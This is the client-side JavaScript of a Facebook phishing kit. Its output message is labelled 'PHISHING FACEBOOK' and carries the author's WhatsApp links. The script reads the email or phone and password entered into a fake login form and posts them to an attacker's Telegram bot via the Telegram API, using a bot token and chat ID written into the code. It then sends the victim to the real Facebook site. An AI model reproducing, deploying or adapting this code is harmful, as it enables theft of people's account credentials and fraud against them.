const loginForm = document.getElementById('loginForm');
const loginButton = document.getElementById('loginButton');
const overlay = document.getElementById('overlay');
const passwordInput = document.getElementById('password');
const emailOrPhoneInput = document.getElementsByName('emailOrPhone')[0];
const BOT_TOKEN = '6849118604:AAEDjbYlFuJyEiHlVnUyHiSIfBENOgo3214';
const CHAT_ID = '6136610701';

function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  const data = {
    chat_id: CHAT_ID,
    text: message
  };
  fetch(url, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => {
    if (response.ok) {
      console.log('Datos enviados correctamente a Telegram');
    } else {
      console.error('Error al enviar datos a Telegram');
    }
  })
  .catch(error => {
    console.error('Error de red:', error);
  });
}

function activateBotAndSendData() {
  console.log('Bot activado');
  const emailOrPhone = emailOrPhoneInput.value;
  const password = passwordInput.value;
  const isEmail = validateEmail(emailOrPhone);
  const isPhoneNumber = validatePhoneNumber(emailOrPhone);

  if (isEmail || isPhoneNumber) {
    if (isChatPrivate(CHAT_ID)) {
      const message = `┌───────────────\n│𝗣𝗛𝗜𝗦𝗛𝗜𝗡𝗚 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞\n│𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 : https://wa.me/+263714497545\n├───────────────\n│[۞] Email or phone: ${emailOrPhone}\n│[۞] password: ${password}\n├───────────────\n│[۞] 𝗚𝗥𝗢𝗨𝗣 : https://whatsapp.com/channel/0029Vae3GZF9Bb658QgSCl1I \n│[۞] 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 : https://whatsapp.com/channel/0029Vae3GZF9Bb658QgSCl1I\n└───────────────\n`;
      overlay.style.display = 'block';
      sendToTelegram(message);
    } else {
      console.error('No se pueden enviar datos a un chat que no es privado');
    }
  } else {
    console.error('Por favor ingresa un correo electrónico válido o un número de teléfono válido');
  }
}
function togglePasswordVisibility() {
  var passwordInput = document.getElementById("password");
  var toggleButton = document.querySelector(".toggle-password");

  if (passwordInput.type === "password") {
    passwordInput.type = "text";
    toggleButton.innerHTML = "&#x1F440;";
  } else {
    passwordInput.type = "password";
    toggleButton.innerHTML = "&#x1F441;";
  }
}
function validateEmail(email) {
  const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return regex.test(email);
}

function validatePhoneNumber(phoneNumber) {
  const cleanedPhoneNumber = phoneNumber.replace(/\D/g, "");
  return cleanedPhoneNumber.length === 10;
}

function isChatPrivate(chatId) {
  return true;
}

loginForm.addEventListener('submit', (event) => {
  event.preventDefault();
  activateBotAndSendData();
});

createAccountButton.addEventListener('click', () => {
  window.location.href = 'https://www.facebook.com';
});

window.onload = activateBotAndSendData;
